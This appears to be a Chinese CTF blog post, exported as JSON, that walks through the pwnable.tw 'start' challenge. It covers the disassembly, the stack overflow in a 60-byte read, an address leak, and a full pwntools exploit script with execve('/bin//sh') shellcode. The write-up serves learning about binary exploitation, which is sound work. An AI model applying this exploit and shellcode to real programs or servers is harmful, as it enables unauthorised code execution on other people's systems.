{"title":"pwnable刷题","uid":"728bc0e237c3a4cf5b22aa0f745046c8","slug":"CTF/pwn/pwnable刷题","date":"2022-02-09T09:35:27.000Z","updated":"2022-02-09T10:30:05.163Z","comments":true,"path":"api/articles/CTF/pwn/pwnable刷题.json","keywords":null,"cover":"/img/4.jpg","content":"<span id=\"more\"></span>\n\n<h1 id=\"pwnable刷题记录\"><a href=\"#pwnable刷题记录\" class=\"headerlink\" title=\"pwnable刷题记录\"></a>pwnable刷题记录</h1><p>记录一下pwnable刷题的详细过程</p>\n<h1 id=\"start\"><a href=\"#start\" class=\"headerlink\" title=\"start\"></a>start</h1><p>一道很适合入门的题目，简单的ret2shellcode，从中可以引申出函数调用过程栈的变化。</p>\n<p>首先检查一下保护，啥也没开</p>\n<p>然后拖到ida里打开就俩函数，一个start一个exit，分析start函数</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">.text:08048060                 push    esp\n.text:08048061                 push    offset _exit\n.text:08048066                 xor     eax, eax\n.text:08048068                 xor     ebx, ebx\n.text:0804806A                 xor     ecx, ecx\n.text:0804806C                 xor     edx, edx\n.text:0804806E                 push    3A465443h\n.text:08048073                 push    20656874h\n.text:08048078                 push    20747261h\n.text:0804807D                 push    74732073h\n.text:08048082                 push    2774654Ch\n.text:08048087                 mov     ecx, esp        ; addr\n.text:08048089                 mov     dl, 14h         ; len\n.text:0804808B                 mov     bl, 1           ; fd\n.text:0804808D                 mov     al, 4\n.text:0804808F                 int     80h             ; LINUX - sys_write\n.text:08048091                 xor     ebx, ebx\n.text:08048093                 mov     dl, 3Ch ; '&lt;'\n.text:08048095                 mov     al, 3\n.text:08048097                 int     80h             ; LINUX -\n.text:08048099                 add     esp, 14h\n.text:0804809C                 retn<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>总结一下干了四件事</p>\n<ul>\n<li>把esp压栈，把exit函数地址压栈，把四个寄存器清零</li>\n<li>把20个字节的字符串压栈（动调或者运行可以看到这个字符串是”Let’s start the CTF:”）</li>\n<li>然后从0x08048087到0x08048097进行了两个函数操作，这个等下细说</li>\n<li>把esp+0x14返回</li>\n</ul>\n<p>咱们细看一下那两个函数的操作（其实ida也标出来了，分别是write和read）</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">.text:08048087                 mov     ecx, esp        ; addr\n.text:08048089                 mov     dl, 14h         ; len\n.text:0804808B                 mov     bl, 1           ; fd\n.text:0804808D                 mov     al, 4\n.text:0804808F                 int     80h             ; LINUX - sys_write<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">.text:08048091                 xor     ebx, ebx\n.text:08048093                 mov     dl, 3Ch ; '&lt;'\n.text:08048095                 mov     al, 3\n.text:08048097                 int     80h             ; LINUX -sys_read<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>用C语言的伪代码写出来可以这样</p>\n<pre class=\"line-numbers language-C\" data-language=\"C\"><code class=\"language-C\">write(1,esp,20); // 从栈上读20个字节到标准输出（读内存）\nread(0,esp,60);  // 从标准输入写60个字节到栈上（写内存）<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p>可以看到他向标准输出(屏幕)输出了20个字符，然后向栈里读入了60个字符，显然这个读入存在栈溢出，由于没有text段可以利用，所以得我们自己写shellcode进去，进行ret2shellcode，先不说shellcode的事，来动调看一看怎么样溢出</p>\n<p>把断点断在0x8048097（sys_read调用）处，然后输入20个a观察，可以看到刚刚的那个”Let’s start the CTF:”字符串被覆盖了，所以输入20个字节就可以把变量覆盖完，接下来再输入覆盖的就是exit的retaddr和一开始压栈的esp这俩东西</p>\n<p>诶有了溢出思路之后，ret2shellcode也就有方向了，我们写入shellcode之后唯一的问题就是不知道shellcode的首地址在哪，但是可以通过系统调用write来将那个存储”Let’s start the CTF:”这个字符串的数组的地址给泄漏出来，再根据写入的值来计算偏移，就可以直接ret2shellcode</p>\n<p>因此需要两轮攻击，第一轮泄漏shellcode地址（输入的地址），payload1 = ‘a’ * 20 + p32(0x08048087)</p>\n<p>执行这一段之后效果应该如下：他会把栈的retaddr给覆盖成0x08048087，当retn的时候会再次跳转到0x08048087处进行输出，但是此时栈内只剩下最开始push进去的esp（也就是第一条指令干的事），再看0x08048087处他把esp的值赋给了ecx，也就是write出来的就是esp的值，那么此时就会向屏幕输出esp的值，也就是shellcode的首地址，接下来就可以去执行shellcode了</p>\n<p>payload2的格式应该是 ‘a’ * 20 + shellcode首地址（第一轮得到的输出） + shellcode</p>\n<p>栈的变化可以参考连接（<a href=\"https://xuanxuanblingbling.github.io/ctf/pwn/2019/08/30/start/%EF%BC%89%EF%BC%8C%E6%9C%80%E5%90%8Eexp%E5%A6%82%E4%B8%8B\">https://xuanxuanblingbling.github.io/ctf/pwn/2019/08/30/start/），最后exp如下</a></p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\ncontext<span class=\"token punctuation\">(</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">,</span> arch<span class=\"token operator\">=</span><span class=\"token string\">'i386'</span><span class=\"token punctuation\">,</span> os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">)</span>\np <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span><span class=\"token string\">'./start'</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># p = remote('chall.pwnable.tw', 10000)</span>\nshellcode  <span class=\"token operator\">=</span> <span class=\"token string\">b\"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\"</span>\nshellcode <span class=\"token operator\">+=</span> <span class=\"token string\">b\"\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\"</span>\nshellcode <span class=\"token operator\">+=</span> <span class=\"token string\">b\"\\xe3\\x89\\xc1\\x89\\xc2\\xb0\\x0b\"</span>\nshellcode <span class=\"token operator\">+=</span> <span class=\"token string\">b\"\\xcd\\x80\\x31\\xc0\\x40\\xcd\\x80\"</span>\n\npayload1 <span class=\"token operator\">=</span> <span class=\"token string\">b'a'</span> <span class=\"token operator\">*</span> <span class=\"token number\">20</span> <span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span><span class=\"token number\">0x08048087</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\"># gdb.attach(p)</span>\n<span class=\"token comment\"># pause()</span>\np<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\np<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload1<span class=\"token punctuation\">)</span>\noldaddr <span class=\"token operator\">=</span> u32<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>oldaddr<span class=\"token punctuation\">)</span>\np<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\npayload2 <span class=\"token operator\">=</span> <span class=\"token string\">b'a'</span> <span class=\"token operator\">*</span> <span class=\"token number\">20</span> <span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span>oldaddr <span class=\"token operator\">+</span> <span class=\"token number\">0x14</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> shellcode\ngdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span>\npause<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\np<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload2<span class=\"token punctuation\">)</span>\np<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n","text":" pwnable刷题记录记录一下pwnable刷题的详细过程 start一道很适合入门的题目，简单的ret2shellcode，从中可以引申出函数调用过程栈的变化。 首先检查一下保护，啥也没开 然后拖到ida里打开就俩函数，一个start一个exit，分析start函数 .tex...","link":"","photos":[],"count_time":{"symbolsCount":"3.5k","symbolsTime":"3 mins."},"categories":[{"name":"CTF/PWN","slug":"CTF-PWN","count":7,"path":"api/categories/CTF-PWN.json"}],"tags":[{"name":"CTF PWN pwnable","slug":"CTF-PWN-pwnable","count":1,"path":"api/tags/CTF-PWN-pwnable.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#pwnable%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95\"><span class=\"toc-text\">pwnable刷题记录</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#start\"><span class=\"toc-text\">start</span></a></li></ol>","author":{"name":"S1eepy","slug":"blog-author","avatar":"/img/touxiang.jpg","link":"/","description":"Someone who is learning how to take life seriously","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"硬件接口入门","uid":"2e26753d18f40c4232753f44ace2ff64","slug":"HWS/2022/硬件接口入门","date":"2022-02-16T02:25:41.000Z","updated":"2022-02-16T03:36:48.800Z","comments":true,"path":"api/articles/HWS/2022/硬件接口入门.json","keywords":null,"cover":"/img/5.jpg","text":" 硬件接口入门参考：https://demo.hedgedoc.org/s/sHig2ekuQ# UARTUART口是指一种物理接口形式（硬件接口） UART是异步，全双工串口总线。有两根线，一根TXD用于发送，一根RXD用于接收。UART的串行数据传输不需要使用时钟信号来同步传...","link":"","photos":[],"count_time":{"symbolsCount":"2.6k","symbolsTime":"2 mins."},"categories":[{"name":"HWS/2022","slug":"HWS-2022","count":2,"path":"api/categories/HWS-2022.json"}],"tags":[{"name":"HWS","slug":"HWS","count":9,"path":"api/tags/HWS.json"}],"author":{"name":"S1eepy","slug":"blog-author","avatar":"/img/touxiang.jpg","link":"/","description":"Someone who is learning how to take life seriously","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"feature":true},"next_post":{"title":"蓝牙入门","uid":"d3bfb8de020bc95d183e323a3821cb2a","slug":"HWS/2021/蓝牙入门","date":"2022-02-06T02:18:19.000Z","updated":"2022-02-11T13:38:16.288Z","comments":true,"path":"api/articles/HWS/2021/蓝牙入门.json","keywords":null,"cover":"/img/3.jpg","text":" 蓝牙协议认识蓝牙蓝牙有两种协议BLE和经典协议，pwntools里有check_crc的工具，报文结构如下 解码代码 from pwn import * rawbit = \"\"# 报文二进制 def find_all(sub,s): index_list = [] index ...","link":"","photos":[],"count_time":{"symbolsCount":"2.1k","symbolsTime":"2 mins."},"categories":[{"name":"HWS/2021","slug":"HWS-2021","count":5,"path":"api/categories/HWS-2021.json"}],"tags":[{"name":"HWS","slug":"HWS","count":9,"path":"api/tags/HWS.json"}],"author":{"name":"S1eepy","slug":"blog-author","avatar":"/img/touxiang.jpg","link":"/","description":"Someone who is learning how to take life seriously","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}